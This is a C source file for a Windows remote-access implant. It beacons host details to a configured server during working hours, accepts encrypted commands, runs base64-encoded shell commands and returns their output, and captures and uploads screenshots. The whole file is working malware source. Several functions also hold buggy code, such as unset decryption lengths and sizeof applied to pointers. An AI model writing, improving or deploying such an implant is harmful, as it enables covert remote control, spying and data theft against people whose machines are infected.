#include "client.h"

void log_it(const char* format, ...) {
    if (!LOGGING || !log_file)
        return;
    
    va_list args;
    va_start(args, format);

    // Get the current time
    time_t now;
    time(&now);
    char timestamp[26];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));

    // Print timestamp
    fprintf(log_file, "[%s] ", timestamp);

    // Print the actual message
    vfprintf(log_file, format, args);

    // Add a newline if it's not already there
    // Note: The newline character check must consider potential escape sequences in the format string.
    size_t format_len = strlen(format);
    if (format_len == 0 || format[format_len - 1] != '\n') {
        fprintf(log_file, "\n");
    }

    fflush(log_file);
    va_end(args);
}

void get_session_id(char* ip_address) {
    if (ip_address == NULL) {
        log_it("Invalid IP address provided");
        return;
    }
    int sum = 0;
    char* token = strtok(ip_address, ".");
    while (token != NULL) {
        sum += atoi(token);
        token = strtok(NULL, ".");
    }
    char input[INET6_ADDRSTRLEN + 12];
    snprintf(input, sizeof(input), "%s<>%d", ip_address, sum);
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char*)input, strlen(input), hash);
    for (int i = 0; i < SESSION_ID_LENGTH / 2; i++) {
        snprintf(&SESSION_ID[i * 2], 3, "%02x", hash[i]);
    }
    SESSION_ID[SESSION_ID_LENGTH] = '\0';  // Null-terminate the string
    log_it("Session ID: %s", SESSION_ID);  // Log the Session ID
}

size_t b64_encoded_size(size_t inlen) {
	size_t ret;
	ret = inlen;
	if (inlen % 3 != 0)
		ret += 3 - (inlen % 3);
	ret /= 3;
	ret *= 4;
	return ret;
}

size_t b64_decoded_size(const char *in)
{
	size_t len;
	size_t ret;
	size_t i;
	if (in == NULL)
		return 0;
	len = strlen(in);
	ret = len / 4 * 3;
	for (i=len; i-->0; ) {
		if (in[i] == '=') {
			ret--;
		} else {
			break;
		}
	}
	return ret;
}

void b64_generate_decode_table() {
	int    inv[80];
	size_t i;
	memset(inv, -1, sizeof(inv));
	for (i=0; i<sizeof(base64_chars)-1; i++) {
		inv[base64_chars[i]-43] = i;
	}
}

int b64_isvalidchar(char c) {
	if (c >= '0' && c <= '9')
		return 1;
	if (c >= 'A' && c <= 'Z')
		return 1;
	if (c >= 'a' && c <= 'z')
		return 1;
	if (c == '+' || c == '/' || c == '=')
		return 1;
	return 0;
}

// Function to encode base64
char *base64_encode(const unsigned char *in, size_t len) {
    char *out;
    size_t elen;
    size_t i, j, v;

    if (in == NULL || len == 0)
        return NULL;

    elen = b64_encoded_size(len);
    out = malloc(elen + 1);  // Allocate memory for encoded string
    if (out == NULL) return NULL;  // Check for allocation failure

    out[elen] = '\0';  // Null-terminate the string

    for (i = 0, j = 0; i < len; i += 3, j += 4) {
        v = in[i];
        v = (i + 1 < len) ? (v << 8 | in[i + 1]) : (v << 8);
        v = (i + 2 < len) ? (v << 8 | in[i + 2]) : (v << 8);

        out[j]   = base64_chars[(v >> 18) & 0x3F];
        out[j+1] = base64_chars[(v >> 12) & 0x3F];
        out[j+2] = (i + 1 < len) ? base64_chars[(v >> 6) & 0x3F] : '=';
        out[j+3] = (i + 2 < len) ? base64_chars[v & 0x3F] : '=';
    }

    return out;
}

// Function to decode a Base64 encoded string into binary data
int base64_decode(const char *in, unsigned char *out, size_t outlen) {
    size_t len;
    size_t i, j;
    int v;
    
    if (in == NULL || out == NULL)
        return 0;

    len = strlen(in);
    if (outlen < b64_decoded_size(in) || len % 4 != 0)
        return 0;

    for (i = 0; i < len; i++) {
        if (!b64_isvalidchar(in[i])) {
            return 0;
        }
    }

    for (i = 0, j = 0; i < len; i += 4, j += 3) {
        v = base64_invs[in[i] - 43];
        v = (v << 6) | base64_invs[in[i+1] - 43];
        v = (in[i+2] == '=') ? (v << 6) : (v << 6) | base64_invs[in[i+2] - 43];
        v = (in[i+3] == '=') ? (v << 6) : (v << 6) | base64_invs[in[i+3] - 43];

        out[j] = (v >> 16) & 0xFF;
        if (in[i+2] != '=')
            out[j+1] = (v >> 8) & 0xFF;
        if (in[i+3] != '=')
            out[j+2] = v & 0xFF;
    }

    return 1;
}

// Encryption function
char* encrypt_data(const char *data, const char *shared_key) {
    unsigned char salt[SALT_LENGTH], iv[IV_LENGTH], key[KEY_LENGTH];
    unsigned char auth_tag[TAG_LENGTH];
    unsigned char *encrypted_data = NULL;
    int len, encrypted_data_len = 0;
    EVP_CIPHER_CTX *ctx;

    // Allocate enough memory for encrypted data
    encrypted_data = malloc(strlen(data) + EVP_CIPHER_block_size(EVP_aes_256_gcm()) - 1);
    if (encrypted_data == NULL) {
        log_it("Memory allocation failed for encrypted data");
        return NULL;
    }

    // Generate random salt and IV
    RAND_bytes(salt, SALT_LENGTH);
    RAND_bytes(iv, IV_LENGTH);

    // Derive key
    PKCS5_PBKDF2_HMAC(shared_key, strlen(shared_key), salt, SALT_LENGTH, 200000, EVP_sha512(), KEY_LENGTH, key);

    // Initialize encryption context
    ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) {
        free(encrypted_data);
        log_it("Failed to create encryption context");
        return NULL;
    }

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) {
        EVP_CIPHER_CTX_free(ctx);
        free(encrypted_data);
        log_it("Failed to initialize encryption context");
        return NULL;
    }

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_LENGTH, NULL);
    if (1 != EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        free(encrypted_data);
        log_it("Failed to set key and IV");
        return NULL;
    }

    // Encrypt the data
    if (1 != EVP_EncryptUpdate(ctx, encrypted_data, &len, (unsigned char *)data, strlen(data))) {
        EVP_CIPHER_CTX_free(ctx);
        free(encrypted_data);
        log_it("Encryption failed");
        return NULL;
    }
    encrypted_data_len = len;

    if (1 != EVP_EncryptFinal_ex(ctx, encrypted_data + len, &len)) {
        EVP_CIPHER_CTX_free(ctx);
        free(encrypted_data);
        log_it("Final encryption step failed");
        return NULL;
    }
    encrypted_data_len += len;

    // Get the authentication tag
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LENGTH, auth_tag)) {
        EVP_CIPHER_CTX_free(ctx);
        free(encrypted_data);
        log_it("Failed to get authentication tag");
        return NULL;
    }

    EVP_CIPHER_CTX_free(ctx);

    // Encode to base64
    char *salt_b64 = base64_encode(salt, SALT_LENGTH);
    char *iv_b64 = base64_encode(iv, IV_LENGTH);
    char *auth_tag_b64 = base64_encode(auth_tag, TAG_LENGTH);
    char *encrypted_data_b64 = base64_encode(encrypted_data, encrypted_data_len);

    if (!salt_b64 || !iv_b64 || !auth_tag_b64 || !encrypted_data_b64) {
        free(encrypted_data);
        free(salt_b64);
        free(iv_b64);
        free(auth_tag_b64);
        free(encrypted_data_b64);
        log_it("Base64 encoding failed");
        return NULL;
    }

    // Prepare the result string
    char *result = (char *)malloc(strlen(salt_b64) + strlen(iv_b64) + strlen(auth_tag_b64) + strlen(encrypted_data_b64) + 4);
    if (!result) {
        free(encrypted_data);
        free(salt_b64);
        free(iv_b64);
        free(auth_tag_b64);
        free(encrypted_data_b64);
        log_it("Memory allocation failed for result");
        return NULL;
    }

    snprintf(result, strlen(salt_b64) + strlen(iv_b64) + strlen(auth_tag_b64) + strlen(encrypted_data_b64) + 4, "%s:%s:%s:%s", salt_b64, iv_b64, auth_tag_b64, encrypted_data_b64);

    OPENSSL_cleanse(key, KEY_LENGTH);
    free(salt_b64);
    free(iv_b64);
    free(auth_tag_b64);
    free(encrypted_data_b64);
    free(encrypted_data);

    return result;
}

// Decryption function
char* decrypt_data(const char *encrypted, const char *shared_key) {
    unsigned char salt[SALT_LENGTH], iv[IV_LENGTH], auth_tag[TAG_LENGTH];
    unsigned char encrypted_data[CHUNK_SIZE];
    unsigned char key[KEY_LENGTH];
    int decrypted_len, encrypted_data_len = 0;
    EVP_CIPHER_CTX *ctx;
    char *encrypted_copy = strdup(encrypted);
    if (!encrypted_copy) return NULL; // Memory allocation failure

    char *parts[4];
    char *token = strtok(encrypted_copy, ":");
    for (int i = 0; i < 4; i++) {
        if (token) {
            parts[i] = token;
            token = strtok(NULL, ":");
        } else {
            free(encrypted_copy);
            log_it("Invalid format of encrypted string");
            return NULL;
        }
    }

    // Base64 decode
    if (!base64_decode(parts[0], salt, SALT_LENGTH) ||
        !base64_decode(parts[1], iv, IV_LENGTH) ||
        !base64_decode(parts[2], auth_tag, TAG_LENGTH) ||
        !base64_decode(parts[3], encrypted_data, CHUNK_SIZE)) {
        free(encrypted_copy);
        log_it("Base64 decoding failed");
        return NULL;
    }

    free(encrypted_copy);

    // Derive key
    PKCS5_PBKDF2_HMAC(shared_key, strlen(shared_key), salt, SALT_LENGTH, 200000, EVP_sha512(), KEY_LENGTH, key);

    // Initialize decryption context
    ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) {
        log_it("Failed to create decryption context");
        return NULL;
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) {
        EVP_CIPHER_CTX_free(ctx);
        log_it("Failed to initialize decryption context");
        return NULL;
    }

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_LENGTH, NULL);
    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        log_it("Failed to set key and IV");
        return NULL;
    }

    if (1 != EVP_DecryptUpdate(ctx, NULL, &decrypted_len, encrypted_data, encrypted_data_len)) {
        EVP_CIPHER_CTX_free(ctx);
        log_it("Decryption failed");
        return NULL;
    }

    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LENGTH, auth_tag)) {
        EVP_CIPHER_CTX_free(ctx);
        log_it("Failed to set authentication tag");
        return NULL;
    }

    if (1 != EVP_DecryptFinal_ex(ctx, NULL, &decrypted_len)) {
        EVP_CIPHER_CTX_free(ctx);
        log_it("Final decryption step failed");
        return NULL;
    }

    EVP_CIPHER_CTX_free(ctx);

    // Return the decrypted data as a string
    return (char *)strdup((char *)encrypted_data);
}

void send_command(const char* response) {
    char* encrypted = encrypt_data(response, SESSION_ID);
    if (encrypted == NULL) {
        log_it("Encryption failed");
        return;
    }
    log_it("Sending data: %s", encrypted);
    size_t encrypted_len = strlen(encrypted);
    if (encrypted_len > CHUNK_SIZE) {
        // Send the data in chunks
        while (encrypted_len > 0) {
            size_t chunk_size = (encrypted_len > CHUNK_SIZE) ? CHUNK_SIZE : encrypted_len;
            char chunk[CHUNK_SIZE + 7]; // Buffer for data chunk + '--FIN--' + null terminator

            // Copy chunk of data
            memcpy(chunk, encrypted, chunk_size);
            encrypted += chunk_size;
            encrypted_len -= chunk_size;

            if (encrypted_len == 0) {
                // Add termination marker for the last chunk
                strcat(chunk, "--FIN--");
                chunk_size += 7; // Increase chunk size to account for the '--FIN--' marker
            }

            // Send the chunk to the socket
            int result = send(client_socket, chunk, chunk_size, 0);
            if (result == SOCKET_ERROR) {
                int error_code = WSAGetLastError();
                log_it("Send failed with error: %d", error_code);
                free(encrypted); // Free after sending all data
                return;
            }
            log_it("Sent chunk successfully.");
        }
    } else {
        // If the encrypted data fits in one chunk
        int result = send(client_socket, encrypted, encrypted_len, 0);
        if (result == SOCKET_ERROR) {
            int error_code = WSAGetLastError();
            log_it("Send failed with error: %d", error_code);
        } else {
            log_it("Sent data successfully.");
        }
    }
    
    free(encrypted); // Free after sending all data
}

void send_beacon() {
    SYSTEM_INFO sysInfo;
    OSVERSIONINFOEX osInfo;
    char hostname[256];
    DWORD size = sizeof(hostname);
    // Get system information
    GetSystemInfo(&sysInfo);
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO)&osInfo);
    GetComputerNameA(hostname, &size);
    // Prepare the beacon message
    char beacon[300];
    const char* beacon_format = "{\"response\": {\"beacon\": true,\"version\": \"%s\",\"type\": \"%s\",\"platform\": \"Windows\",\"arch\": \"%s\",\"osver\": \"%lu.%lu.%lu\",\"hostname\": \"%s\"}}";
    const char* arch = sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86";
    // Format the beacon message into the buffer
    snprintf(beacon, sizeof(beacon), beacon_format, CVER, TYPE, arch, osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber, hostname);
    // Send the command with the formatted beacon message
    send_command(beacon);
}

void sleep_ms(int milliseconds) {
    Sleep(milliseconds);
}

// Function to convert UTF-8 to UTF-16
WCHAR* utf8_to_utf16(const char* str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    WCHAR* result = malloc(len * sizeof(WCHAR));
    if (!result) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, str, -1, result, len);
    return result;
}

// Function to simulate setInterval for beacon
DWORD WINAPI beacon_interval_thread(LPVOID lpParam) {
    (void)lpParam;
    while (!exit_process) {
        sleep_ms(BEACON_MIN_INTERVAL + (rand() % (BEACON_MAX_INTERVAL - BEACON_MIN_INTERVAL + 1)));
        SYSTEMTIME st;
        GetLocalTime(&st);
        // Check if it's Monday through Friday (1-5) and between 7 AM and 7 PM
        if (st.wDayOfWeek >= 1 && st.wDayOfWeek <= 5 && 
            st.wHour >= 7 && st.wHour <= 19) {
            send_beacon();
        }
    }
    return 0;
}

// Function to start beacon interval thread
HANDLE start_beacon_interval() {
    HANDLE threadHandle;
    
    // Send the first beacon
    send_beacon();
    
    // Create the thread
    threadHandle = CreateThread(NULL, 0, beacon_interval_thread, NULL, 0, NULL);
    
    // Check if the thread was created successfully
    if (threadHandle == NULL) {
        // Handle the error (optional, e.g., log the error or return NULL)
        return NULL;
    }
    
    // Return the thread handle to the caller
    return threadHandle;
}

// Function to save a bitmap as PNG
HRESULT SaveBitmapToPNG(HBITMAP hBitmap, const WCHAR* filename) {
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return hr;

    IWICImagingFactory* pFactory = NULL;
    IWICBitmap* pWICBitmap = NULL;
    IWICBitmapEncoder* pEncoder = NULL;
    IWICBitmapFrameEncode* pFrame = NULL;
    IWICStream* pStream = NULL;
    BITMAP bmp;
    void* pPixels = NULL;

    hr = CoCreateInstance(&CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER, &IID_IWICImagingFactory, (LPVOID*)&pFactory);
    if (FAILED(hr)) goto cleanup;

    hr = pFactory->lpVtbl->CreateStream(pFactory, &pStream);
    if (FAILED(hr)) goto cleanup;

    hr = pStream->lpVtbl->InitializeFromFilename(pStream, filename, GENERIC_WRITE);
    if (FAILED(hr)) goto cleanup;

    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    BITMAPINFO bmpInfo = { 0 };
    bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmpInfo.bmiHeader.biWidth = bmp.bmWidth;
    bmpInfo.bmiHeader.biHeight = bmp.bmHeight;
    bmpInfo.bmiHeader.biPlanes = 1;
    bmpInfo.bmiHeader.biBitCount = 32;
    bmpInfo.bmiHeader.biCompression = BI_RGB;

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);

    pPixels = malloc(bmp.bmWidth * bmp.bmHeight * 4);
    if (!pPixels) {
        hr = E_OUTOFMEMORY;
        goto cleanup;
    }

    if (!GetDIBits(hdcMem, hBitmap, 0, bmp.bmHeight, pPixels, &bmpInfo, DIB_RGB_COLORS)) {
        hr = E_FAIL;
        goto cleanup;
    }

    SelectObject(hdcMem, hOldBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    WICPixelFormatGUID pixelFormat = GUID_WICPixelFormat32bppBGRA;
    hr = pFactory->lpVtbl->CreateBitmapFromMemory(pFactory, bmp.bmWidth, bmp.bmHeight, &pixelFormat, bmp.bmWidth * 4, bmp.bmWidth * bmp.bmHeight * 4, (BYTE*)pPixels, &pWICBitmap);
    if (FAILED(hr)) goto cleanup;

    hr = pFactory->lpVtbl->CreateEncoder(pFactory, &GUID_ContainerFormatPng, NULL, &pEncoder);
    if (FAILED(hr)) goto cleanup;

    hr = pEncoder->lpVtbl->Initialize(pEncoder, (IStream*)pStream, WICBitmapEncoderNoCache);
    if (FAILED(hr)) goto cleanup;

    hr = pEncoder->lpVtbl->CreateNewFrame(pEncoder, &pFrame, NULL);
    if (FAILED(hr)) goto cleanup;

    hr = pFrame->lpVtbl->Initialize(pFrame, NULL);
    if (FAILED(hr)) goto cleanup;

    hr = pFrame->lpVtbl->SetSize(pFrame, bmp.bmWidth, bmp.bmHeight);
    if (FAILED(hr)) goto cleanup;

    hr = pFrame->lpVtbl->SetPixelFormat(pFrame, &pixelFormat);
    if (FAILED(hr)) goto cleanup;

    hr = pFrame->lpVtbl->WriteSource(pFrame, (IWICBitmapSource*)pWICBitmap, NULL);
    if (FAILED(hr)) goto cleanup;

    hr = pFrame->lpVtbl->Commit(pFrame);
    if (FAILED(hr)) goto cleanup;

    hr = pEncoder->lpVtbl->Commit(pEncoder);
    
cleanup:
    if (pPixels) free(pPixels);
    if (pFrame) pFrame->lpVtbl->Release(pFrame);
    if (pEncoder) pEncoder->lpVtbl->Release(pEncoder);
    if (pWICBitmap) pWICBitmap->lpVtbl->Release(pWICBitmap);
    if (pStream) pStream->lpVtbl->Release(pStream);
    if (pFactory) pFactory->lpVtbl->Release(pFactory);
    CoUninitialize();
    return hr;
}

// Function to run the screenshot capture and processing
void run_screenshot() {
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        fprintf(stderr, "Failed to get screen DC\n");
        return;
    }

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        fprintf(stderr, "Failed to create compatible DC\n");
        ReleaseDC(NULL, hdcScreen);
        return;
    }

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);

    if (!hBitmap || !BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY)) {
        fprintf(stderr, "Failed to capture screenshot\n");
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return;
    }

    time_t now;
    time(&now);
    char timestamp[26];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d-%H-%M-%S", localtime(&now));

    char filename[50];
    snprintf(filename, sizeof(filename), "screenshot-%s.png", timestamp);
    wchar_t wFilename[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, filename, -1, wFilename, MAX_PATH);

    HRESULT hr = SaveBitmapToPNG(hBitmap, wFilename);

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    if (SUCCEEDED(hr)) {
        // Read the file and encode it
        FILE* file = _wfopen(wFilename, L"rb");
        if (file) {
            fseek(file, 0, SEEK_END);
            long file_size = ftell(file);
            fseek(file, 0, SEEK_SET);

            unsigned char* file_data = malloc(file_size);
            if (file_data) {
                fread(file_data, 1, file_size, file);
                char* base64_data = base64_encode(file_data, file_size);
                if (base64_data) {
                    // Prepare and send the command
                    char* command = malloc(strlen(base64_data) + 100);
                    if (command) {
                        snprintf(command, strlen(base64_data) + 100, "{\"response\": {\"name\": \"%s\", \"data\": \"%s\"}}", filename, base64_data);
                        send_command(command);
                        free(command);
                    }
                    free(base64_data);
                }
                free(file_data);
            }
            fclose(file);
            _wremove(wFilename); // Optionally delete the file after sending
        }
    } else {
        fprintf(stderr, "Failed to save screenshot\n");
    }
}

// Function to handle webcam (placeholder)
void run_webcam_clip() {
    // This would require platform-specific libraries
    send_command("{\"response\": {\"error\": \"Webcam functionality not implemented\"}}");
}

// Function to parse and execute action
void parse_action(const char* action) {
    char* action_copy = _strdup(action);
    char* command = strtok(action_copy, " ");

    if (command == NULL) {
        send_command("{\"response\": {\"error\": \"No command provided\"}}");
        free(action_copy);
        return;
    }

    if (strcmp(command, "up") == 0) {
        get_uptime();
    } else if (strcmp(command, "di") == 0) {
        exit_process = TRUE;
        send_command("{\"response\": {\"data\": \"Disconnecting...\"}}");
    } else if (strcmp(command, "cmd") == 0 || strcmp(command, "ps") == 0) {
        char* payload = strtok(NULL, "");
        if (payload) {
            int decoded_len = EVP_DecodeBlock(NULL, (const unsigned char*)payload, strlen(payload));
            char* decoded_payload = malloc(decoded_len + 1);
            if (decoded_payload) {
                EVP_DecodeBlock((unsigned char*)decoded_payload, (const unsigned char*)payload, strlen(payload));
                decoded_payload[decoded_len] = '\0';  // Null-terminate the string
                char* result = run_command(decoded_payload);
                char* response = malloc(strlen(result) + 64);  // 64 for the JSON wrapper
                if (response) {
                    snprintf(response, sizeof(response), "{\"response\": {\"data\": \"%s\"}}", result);
                    send_command(response);
                    free(response);
                } else {
                    send_command("{\"response\": {\"error\": \"Memory allocation failed\"}}");
                }
                free(result);
                free(decoded_payload);
            } else {
                send_command("{\"response\": {\"error\": \"Memory allocation failed\"}}");
            }
        } else {
            send_command("{\"response\": {\"error\": \"No payload provided\"}}");
        }
    } else if (strcmp(command, "ss") == 0) {
        run_screenshot();
    } else if (strcmp(command, "wc") == 0) {
        run_webcam_clip();
    } else {
        char error_msg[100];
        snprintf(error_msg, sizeof(error_msg), "{\"response\": {\"error\": \"Unsupported command: %s\"}}", command);
        send_command(error_msg);
    }

    free(action_copy);
}

// Function to format file name
char* format_file_name(const char* name, const char* extension) {
    time_t now;
    struct tm tm_info;
    char timestamp[20];
    char* file_name = malloc(100);  // Adjust size as needed

    if (!file_name) {
        free(file_name);
        return NULL;
    }

    time(&now);
    localtime_s(&tm_info, &now);
    strftime(timestamp, 20, "%Y-%m-%d_%H-%M-%S", &tm_info);

    snprintf(file_name, sizeof(file_name), "%s_%s.%s", name, timestamp, extension);
    return file_name;
}

// Function to format time
char* format_time(long milliseconds) {
    long total_seconds = milliseconds / 1000;
    int days = (int)(total_seconds / 86400);
    int hours = (int)((total_seconds % 86400) / 3600);
    int minutes = (int)((total_seconds % 3600) / 60);
    int seconds = (int)(total_seconds % 60);

    char* formatted_time = malloc(50);  // Adjust size as needed
    if (!formatted_time) {
        free(formatted_time);
        return NULL;
    }
    snprintf(formatted_time, sizeof(formatted_time), "%dd %dh %dm %ds", days, hours, minutes, seconds);
    return formatted_time;
}

// Function to get uptime
void get_uptime() {
    time_t current_time;
    time(&current_time);
    long uptime_millis = (long)(difftime(current_time, start_time) * 1000);
    char* uptime = format_time(uptime_millis);
    
    if (uptime) {
        char response[256];
        snprintf(response, sizeof(response), "{\"response\": {\"data\": \"%s\"}}", uptime);
        send_command(response);
        free(uptime);
    } else {
        send_command("{\"response\": {\"error\": \"Failed to get uptime\"}}");
    }
}

// Function to run a command
char* run_command(const char* command) {
    char* output = NULL;
    size_t output_size = 0;
    char buffer[128];
    FILE* pipe = _popen(command, "r");

    if (!pipe) {
        return _strdup("Failed to run command");
    }

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        size_t len = strlen(buffer);
        char* new_output = realloc(output, output_size + len + 1);
        if (!new_output) {
            free(output);
            _pclose(pipe);
            return _strdup("Memory allocation failed");
        }
        output = new_output + output_size;
        memcpy(output, buffer, len);
        output_size += len;
        // null terminate
        output[output_size] = '\0';
    }

    _pclose(pipe);
    return output ? output : _strdup("");
}

// Function to handle connection and communication
void handle_connection() {
    char buffer[CHUNK_SIZE] = {0};
    
    // Receive data from the client socket
    int valread = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    
    // Check if data was read successfully
    if (valread > 0) {
        // Null-terminate the buffer to ensure it is a valid C string
        buffer[valread] = '\0';
        
        // Decrypt the data
        char* decrypted = decrypt_data(buffer, SESSION_ID);
        if (decrypted) {
            // Parse the decrypted data
            parse_action(decrypted);
            // Free the decrypted data buffer
            free(decrypted);
        } else {
            log_it("Decryption failed");
        }
    } else if (valread == 0) {
        // Connection was closed gracefully
        log_it("Socket disconnected.");
    }
    
    // Optionally, clear the buffer explicitly (not strictly necessary as it's overwritten)
    ZeroMemory(buffer, sizeof(buffer));
}

// Function to convert sockaddr to IP address and port
char* get_peer_info(SOCKET sock) {
    static char ip_str[INET6_ADDRSTRLEN]; // Static buffer to hold IP address

    struct sockaddr_storage addr;
    int addr_len = sizeof(addr);

    if (getpeername(sock, (struct sockaddr*)&addr, &addr_len) == 0) {
        if (addr.ss_family == AF_INET) {
            struct sockaddr_in* ipv4 = (struct sockaddr_in*)&addr;
            inet_ntop(AF_INET, &ipv4->sin_addr, ip_str, sizeof(ip_str));
        } else if (addr.ss_family == AF_INET6) {
            struct sockaddr_in6* ipv6 = (struct sockaddr_in6*)&addr;
            inet_ntop(AF_INET6, &ipv6->sin6_addr, ip_str, sizeof(ip_str));
        }
    } else {
        log_it("getpeername failed with error: %d\n", WSAGetLastError());
        return NULL; // Return NULL if there is an error
    }
    return ip_str; // Return the IP address string
}

int connect_to_server() {
    WSADATA wsaData;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    char port_str[6];
    int retry_count = 0;

    // Initialize Winsock
    int startupResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (startupResult != 0) {
        log_it("WSAStartup failed with error: %d", startupResult);
        return -1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    snprintf(port_str, sizeof(port_str), "%d", SERVER_PORT);

    // Resolve the server address and port
    int addrResult = getaddrinfo(SERVER_ADDRESS, port_str, &hints, &result);
    if (addrResult != 0) {
        log_it("getaddrinfo failed with error: %d", addrResult);
        WSACleanup();
        return -1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        client_socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (client_socket == INVALID_SOCKET) {
            log_it("Socket creation failed with error: %ld", WSAGetLastError());
            continue; // Try the next address
        }

        int connectResult = connect(client_socket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (connectResult == SOCKET_ERROR) {
            closesocket(client_socket);
            client_socket = INVALID_SOCKET;
            if (retry_count >= MAX_RETRIES) {
                log_it("Connect attempt %d failed", retry_count);
                break;
            }
            log_it("Connect attempt %d failed, retrying...", retry_count);
            Sleep(1000 * retry_count); // Exponential backoff
            retry_count++;
            continue;
        }

        log_it("Client connected.");

        // Get peer information
        char* peer_ip = get_peer_info(client_socket);
        if (peer_ip) {
            strcpy(IP_ADDRESS, peer_ip);
            log_it("IP Address: %s", IP_ADDRESS);
        } else {
            log_it("Failed to get peer information.");
        }
        break;
    }

    freeaddrinfo(result);

    if (client_socket == INVALID_SOCKET) {
        log_it("Unable to connect to server after %d attempts", MAX_RETRIES);
        WSACleanup();
        return -1;
    }

    // Set receive timeout
    DWORD timeout = 5000; // 5 seconds
    setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    // Generate and store session ID
    get_session_id(IP_ADDRESS);

    return 0;
}

int main() {
    log_file = fopen("client.log", "a");
    if (!log_file) {
        fprintf(stderr, "Failed to open log file\n");
        return 1;
    }

    time(&start_time);
    
    while (!exit_process) {
        if (connect_to_server() < 0) {
            log_it("Failed to connect to server");
            exit_process = TRUE;
        } else {
            // Send initial beacon
            HANDLE beaconThreadHandle = start_beacon_interval();
            if (beaconThreadHandle != NULL) {
                // Wait for the thread to complete, if necessary
                WaitForSingleObject(beaconThreadHandle, INFINITE);
                
                // Close the handle when done
                CloseHandle(beaconThreadHandle);
            }
            handle_connection();
        }
    }

    if (client_socket != INVALID_SOCKET) {
        closesocket(client_socket);
    }
    WSACleanup();
    fclose(log_file);
    return 0;
}